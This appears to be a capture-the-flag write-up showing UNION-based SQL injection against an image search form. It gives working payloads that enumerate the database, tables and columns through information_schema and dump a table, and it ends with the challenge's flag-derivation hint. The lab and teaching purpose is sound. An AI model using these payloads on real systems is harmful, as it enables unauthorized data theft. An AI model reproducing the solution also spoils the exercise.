# **Description:**

The challenge presented a web page with a "SEARCH IMAGE" section. Clicking on it led to an input field labeled "IMAGE NUMBER:" with a submit button. The objective was to identify and exploit a potential SQL injection vulnerability.

## **Vulnerability:**

The application was vulnerable to UNION-based SQL injection due to unsanitized user input in the search field.

## **Exploitation:**

### `Testing for SQL Injection:`
Entering `1'` in the input field resulted in no output. However, testing with:
```
1 union select null, null
```
returned:
```
ID: 1 union select null, null
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 1 union select null, null
Title:
Url :
```
This confirmed the presence of a UNION-based SQL injection vulnerability.

### `Retrieving Database Name:`
```
0 union select null, database()
```
Returned:
```
ID: 0 union select null, database()
Title: Member_images
Url :
```
The database name was `Member_images`.

### `Enumerating Tables:`
```
0 union select null, group_concat(table_name) from information_schema.tables where table_schema=0x4d656d6265725f696d61676573
```
Result:
```
ID: 0 union select null, group_concat(table_name) from information_schema.tables where table_schema=0x4d656d6265725f696d61676573
Title: list_images
Url :
```
The table `list_images` was identified.

### `Enumerating Columns:`
```
0 union select null, group_concat(column_name) from information_schema.columns where table_name=0x6c6973745f696d61676573
```
Result:
```
ID: 0 union select null, group_concat(column_name) from information_schema.columns where table_name=0x6c6973745f696d61676573
Title: id,url,title,comment
Url :
```
The columns in `list_images` were `id, url, title, comment`.

### `Extracting Data:`
```
0 union select null, group_concat(id, 0x3a, url, 0x3a, title, 0x3a, comment) from list_images
```
Result:
```
ID: 0 union select null, group_concat(id, 0x3a, url, 0x3a, title, 0x3a, comment) from list_images
Title: 1:https://fr.wikipedia.org/wiki/Programme_:Nsa:An image about the NSA !,2:https://fr.wikipedia.org/wiki/Fichier:42:42 !:There is a number..,3:https://fr.wikipedia.org/wiki/Logo_de_Go:Google:Google it !,4:https://en.wikipedia.org/wiki/Earth#/med:Earth:Earth!,5:borntosec.ddns.net/images.png:Hack me ?:If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url :
```
The extracted data included a clue leading to the final flag.

## **Flag Retrieval:**
The comment field contained a hint: `If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`.
By decoding the MD5 hash to lowercase and then applying SHA256, the final flag was obtained.

